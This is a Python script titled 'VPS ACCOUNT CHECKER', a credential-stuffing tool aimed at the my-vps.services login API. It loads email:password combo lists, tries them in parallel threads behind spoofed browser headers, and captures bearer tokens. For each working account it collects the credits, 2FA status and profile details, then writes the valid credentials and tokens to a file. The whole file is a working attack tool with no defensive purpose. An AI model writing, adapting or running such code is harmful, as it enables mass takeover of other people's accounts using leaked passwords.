import requests
import json
import os
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
import time

class VPSAPIClient:
    def __init__(self):
        self.base_url = "https://www.my-vps.services"
        
        # Common headers for all requests
        self.headers = {
            "accept": "application/json, text/plain, */*",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "en-US,en;q=0.9,fil;q=0.8",
            "origin": "https://www.my-vps.services",
            "referer": "https://www.my-vps.services/login",
            "sec-ch-ua": '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
            "x-requested-with": "XMLHttpRequest"
        }
    
    def check_account(self, email, password):
        """
        Check if account credentials are valid
        
        Args:
            email (str): User email
            password (str): User password
            
        Returns:
            tuple: (is_valid, user_info, bearer_token)
        """
        session = requests.Session()
        
        # Step 1: Login
        url = f"{self.base_url}/api/login"
        payload = {
            "email": email,
            "password": password
        }
        
        headers = self.headers.copy()
        headers["content-type"] = "application/json"
        
        try:
            response = session.post(url, json=payload, headers=headers, timeout=30)
            
            if response.status_code != 200:
                return False, None, None
            
            data = response.json()
            
            # Extract bearer token - check different possible locations
            bearer_token = None
            if "token" in data:
                bearer_token = data["token"]
            elif "access_token" in data:
                bearer_token = data["access_token"]
            elif isinstance(data, dict) and "data" in data:
                if "token" in data["data"]:
                    bearer_token = data["data"]["token"]
                elif "access_token" in data["data"]:
                    bearer_token = data["data"]["access_token"]
            
            # If still no token but response is 200, try to extract from any nested structure
            if not bearer_token and isinstance(data, dict):
                for key, value in data.items():
                    if isinstance(value, str) and len(value) > 20 and '|' in value:
                        bearer_token = value
                        break
            
            if not bearer_token:
                return False, None, None
            
            # Step 2: Get user info
            url_me = f"{self.base_url}/api/me"
            headers_me = self.headers.copy()
            headers_me["authorization"] = f"Bearer {bearer_token}"
            
            response_me = session.get(url_me, headers=headers_me, timeout=30)
            
            if response_me.status_code == 200:
                user_info = response_me.json()
                # Check if user info is nested in 'data' or 'user' key
                if isinstance(user_info, dict):
                    if "data" in user_info:
                        user_info = user_info["data"]
                    elif "user" in user_info:
                        user_info = user_info["user"]
                return True, user_info, bearer_token
            else:
                # Even if /me fails, still return valid with token
                return True, {"error": "Could not fetch user info"}, bearer_token
                
        except Exception as e:
            return False, None, None


class BulkChecker:
    def __init__(self, combo_file, threads):
        self.combo_file = combo_file
        self.threads = threads
        self.client = VPSAPIClient()
        self.lock = Lock()
        
        # Statistics
        self.total = 0
        self.checked = 0
        self.valid = 0
        self.invalid = 0
        
        # Results
        self.valid_accounts = []
        
        # Colors
        self.GREEN = '\033[92m'
        self.YELLOW = '\033[93m'
        self.RESET = '\033[0m'
        
    def load_combos(self):
        """Load email:password combos from file"""
        combos = []
        
        try:
            with open(self.combo_file, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if ':' in line:
                        parts = line.split(':', 1)
                        if len(parts) == 2:
                            email, password = parts
                            combos.append((email.strip(), password.strip()))
            
            self.total = len(combos)
            print(f"\n✓ Loaded {self.total} combos from {self.combo_file}")
            return combos
            
        except FileNotFoundError:
            print(f"\n✗ File not found: {self.combo_file}")
            return []
        except Exception as e:
            print(f"\n✗ Error reading file: {e}")
            return []
    
    def check_single(self, email, password):
        """Check a single account"""
        is_valid, user_info, bearer_token = self.client.check_account(email, password)
        
        with self.lock:
            self.checked += 1
            
            if is_valid:
                self.valid += 1
                self.valid_accounts.append({
                    'email': email,
                    'password': password,
                    'token': bearer_token,
                    'info': user_info
                })
                
                # Format user info for display
                info_display = ""
                if user_info and isinstance(user_info, dict):
                    info_parts = []
                    
                    # Extract specific fields in order
                    if 'id' in user_info:
                        info_parts.append(f"ID:{user_info['id']}")
                    if 'name' in user_info:
                        info_parts.append(f"Name:{user_info['name']}")
                    if 'email' in user_info:
                        info_parts.append(f"Email:{user_info['email']}")
                    if 'status' in user_info:
                        info_parts.append(f"Status:{user_info['status']}")
                    if 'credits' in user_info:
                        info_parts.append(f"Credits:{user_info['credits']}")
                    if 'country_name' in user_info:
                        info_parts.append(f"Country:{user_info['country_name']}")
                    if 'google2fa_enable' in user_info:
                        g2fa = "Yes" if user_info['google2fa_enable'] else "No"
                        info_parts.append(f"Google2FA:{g2fa}")
                    if 'two_fa_enable' in user_info:
                        tfa = "Yes" if user_info['two_fa_enable'] else "No"
                        info_parts.append(f"2FA:{tfa}")
                    if 'created_at' in user_info:
                        created = user_info['created_at']
                        if isinstance(created, str) and 'T' in created:
                            created = created.split('T')[0]
                        info_parts.append(f"Created:{created}")
                    if 'updated_at' in user_info:
                        updated = user_info['updated_at']
                        if isinstance(updated, str) and 'T' in updated:
                            updated = updated.split('T')[0]
                        info_parts.append(f"Updated:{updated}")
                    
                    if info_parts:
                        info_display = " | " + " | ".join(info_parts)
                
                # Print in GREEN
                print(f"{self.GREEN}[{self.checked}/{self.total}] ✓ VALID | {email}:{password}{info_display}{self.RESET}")
                
            else:
                self.invalid += 1
                # Print in YELLOW
                print(f"{self.YELLOW}[{self.checked}/{self.total}] ✗ INVALID | {email}:{password}{self.RESET}")
            
            # Print progress bar
            self.print_progress_bar()
        
        return is_valid
    
    def print_progress_bar(self):
        """Print progress bar"""
        bar_width = 50
        filled = int(bar_width * self.checked / self.total) if self.total > 0 else 0
        bar = '█' * filled + '░' * (bar_width - filled)
        percentage = (self.checked / self.total * 100) if self.total > 0 else 0
        
        # Print GREEN progress bar
        print(f"{self.GREEN}[{bar}] {percentage:.1f}% | Checked: {self.checked}/{self.total} | Valid: {self.valid} | Invalid: {self.invalid}{self.RESET}\n")
    
    def save_results(self):
        """Save valid accounts to file"""
        if not self.valid_accounts:
            return
        
        # Get script directory
        script_dir = os.path.dirname(os.path.abspath(__file__))
        
        # Save as clean text file with info
        txt_file = os.path.join(script_dir, "valid_accounts.txt")
        with open(txt_file, 'w', encoding='utf-8') as f:
            for acc in self.valid_accounts:
                info = acc.get('info', {})
                info_parts = []
                
                # Format info same as screen output
                if info and isinstance(info, dict):
                    if 'id' in info:
                        info_parts.append(f"ID:{info['id']}")
                    if 'name' in info:
                        info_parts.append(f"Name:{info['name']}")
                    if 'email' in info:
                        info_parts.append(f"Email:{info['email']}")
                    if 'status' in info:
                        info_parts.append(f"Status:{info['status']}")
                    if 'credits' in info:
                        info_parts.append(f"Credits:{info['credits']}")
                    if 'country_name' in info:
                        info_parts.append(f"Country:{info['country_name']}")
                    if 'google2fa_enable' in info:
                        g2fa = "Yes" if info['google2fa_enable'] else "No"
                        info_parts.append(f"Google2FA:{g2fa}")
                    if 'two_fa_enable' in info:
                        tfa = "Yes" if info['two_fa_enable'] else "No"
                        info_parts.append(f"2FA:{tfa}")
                    if 'created_at' in info:
                        created = info['created_at']
                        if isinstance(created, str) and 'T' in created:
                            created = created.split('T')[0]
                        info_parts.append(f"Created:{created}")
                    if 'updated_at' in info:
                        updated = info['updated_at']
                        if isinstance(updated, str) and 'T' in updated:
                            updated = updated.split('T')[0]
                        info_parts.append(f"Updated:{updated}")
                
                info_display = " | ".join(info_parts) if info_parts else ""
                line = f"{acc['email']}:{acc['password']}"
                if info_display:
                    line += f" | {info_display}"
                
                f.write(line + "\n")
        
        print(f"\n✓ Valid accounts saved to:")
        print(f"  - {txt_file}")
    
    def run(self):
        """Run bulk checking"""
        combos = self.load_combos()
        
        if not combos:
            return
        
        print(f"\n{'='*60}")
        print(f"Starting bulk check with {self.threads} threads...")
        print(f"{'='*60}\n")
        
        start_time = time.time()
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            for email, password in combos:
                future = executor.submit(self.check_single, email, password)
                futures.append(future)
            
            # Wait for all tasks to complete
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    print(f"Error: {e}")
        
        elapsed_time = time.time() - start_time
        
        # Display results
        print(f"\n{'='*60}")
        print("BULK CHECK COMPLETED")
        print(f"{'='*60}")
        print(f"Total Checked:  {self.checked}")
        print(f"Valid:          {self.valid} ✓")
        print(f"Invalid:        {self.invalid} ✗")
        print(f"Time Elapsed:   {elapsed_time:.2f} seconds")
        print(f"{'='*60}\n")
        
        # Save results
        if self.valid > 0:
            self.save_results()


def main():
    print("=" * 60)
    print("VPS ACCOUNT CHECKER")
    print("=" * 60)
    
    # Get combo file
    combo_file = input("\nEnter combo file path (email:password format): ").strip()
    
    if not os.path.exists(combo_file):
        print(f"\n✗ Error: File '{combo_file}' not found!")
        return
    
 
    max_threads = os.cpu_count() * 2 or 15
    print(f"\nRecommended max threads: {max_threads}")
    
    while True:
        try:
            threads = int(input(f"Enter number of threads to use (1-{max_threads}): ").strip())
            if 1 <= threads <= max_threads:
                break
            else:
                print(f"Please enter a number between 1 and {max_threads}")
        except ValueError:
            print("Please enter a valid number")
    
    # Start bulk checking
    checker = BulkChecker(combo_file, threads)
    checker.run()


if __name__ == "__main__":
    main()